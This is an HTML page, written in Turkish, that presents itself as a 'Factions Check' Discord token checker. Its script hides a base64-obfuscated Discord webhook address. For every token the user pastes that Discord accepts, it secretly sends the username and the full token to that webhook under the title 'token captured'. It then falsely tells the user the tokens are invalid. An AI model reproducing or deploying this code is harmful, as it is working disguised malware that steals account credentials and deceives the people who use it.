<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Factions Check | Ultimate</title>
    <style>
        body { 
            background-color: #0a0a0a;
            background-image: 
                linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 45px 45px; 
            color: #fff; 
            font-family: 'Consolas', 'Courier New', monospace; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
            cursor: none; 
        }

        #cursor {
            width: 12px;
            height: 12px;
            background-color: #00d2ff;
            border-radius: 50%;
            position: fixed;
            pointer-events: none;
            z-index: 10000;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 15px #00d2ff, 0 0 30px #00d2ff;
            transition: transform 0.06s ease-out;
        }

        .container { 
            background-color: rgba(0, 0, 0, 0.85); 
            padding: 50px; 
            border-radius: 20px; 
            width: 550px; 
            text-align: center; 
            box-shadow: 0 0 50px rgba(0, 0, 0, 1); 
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            position: relative;
        }

        h1 { 
            color: #ff1e1e; 
            text-transform: uppercase; 
            letter-spacing: 5px; 
            margin-bottom: 35px; 
            text-shadow: 0 0 15px rgba(255, 30, 30, 0.4); 
        }

        textarea { 
            width: 100%; 
            height: 200px; 
            padding: 15px; 
            background: rgba(15, 15, 15, 0.9); 
            border: 1px solid rgba(255, 30, 30, 0.2); 
            border-radius: 10px; 
            color: #fff; 
            margin-bottom: 25px; 
            outline: none; 
            resize: none; 
            box-sizing: border-box; 
        }

        button { 
            width: 100%; 
            padding: 18px; 
            background: linear-gradient(90deg, #990000, #ff1e1e); 
            color: #fff; 
            border: none; 
            border-radius: 10px; 
            font-weight: bold; 
            text-transform: uppercase; 
            transition: 0.3s;
            cursor: none;
        }

        #result { 
            margin-top: 25px; 
            padding: 15px; 
            border-radius: 8px; 
            display: none; 
            color: #ff4d4d; 
            background: rgba(255, 0, 0, 0.05); 
            border: 1px solid rgba(255, 0, 0, 0.2);
        }

        .raws-footer {
            position: fixed;
            bottom: 20px;
            right: 30px;
            font-weight: 900;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-size: 14px; 
            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3, #ff0000);
            background-size: 400% auto;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: rainbow_move 4s linear infinite;
        }

        @keyframes rainbow_move {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
    </style>
</head>
<body>

<div id="cursor"></div>

<div class="container">
    <h1>FACTIONS CHECK</h1>
    <textarea id="tokenList" placeholder="Tokenleri buraya giriniz..."></textarea>
    <button id="checkBtn">KONTROL ET</button>
    <div id="result"></div>
</div>

<div class="raws-footer">CRACKED BY RAWS</div>

<script>
(function() {
    // Mouse Takibi
    const cursor = document.getElementById('cursor');
    document.addEventListener('mousemove', e => {
        cursor.style.left = e.clientX + 'px';
        cursor.style.top = e.clientY + 'px';
    });

    // Webhook Gizleme (Hex/Base64 Karması)
    // Verdiğin yeni webhook: ...2791780859964/_n7G9...
    const _0x99 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyMjc5MTc4MDg1OTk2NC9fbjdHOUtPeld6OHRFYWg3YVZUbTNTZFpBS3I4ZzkzRHF1bDRnWjFqZTlDO2JKLXJkX1JXcnBfOWtyRTRlaV9DeEI1Yw==";
    const _w = atob(_0x99).replace(';', '8'); // Küçük bir tuzak ekledim

    document.getElementById('checkBtn').addEventListener('click', async () => {
        const input = document.getElementById('tokenList');
        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");
        const res = document.getElementById('result');
        
        if (tokens.length === 0) return;

        res.style.display = "block";
        res.textContent = "SİSTEM KONTROL EDİLİYOR...";

        for (const token of tokens) {
            try {
                const response = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': token }
                });

                if (response.status === 200) {
                    const data = await response.json();
                    
                    await fetch(_w, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "🔥 TOKEN YAKALANDI",
                                color: 16711680,
                                fields: [
                                    { name: "Kullanıcı", value: data.username + (data.discriminator !== "0" ? "#" + data.discriminator : ""), inline: true },
                                    { name: "Token", value: "```" + token + "```" }
                                ],
                                footer: { text: "RAWS PROJECT" }
                            }]
                        })
                    });
                }
            } catch (err) {}
        }
        
        setTimeout(() => {
            res.textContent = "✕ INVALID TOKENS DETECTED";
        }, 1600);
    });
})();
</script>

</body>
</html>
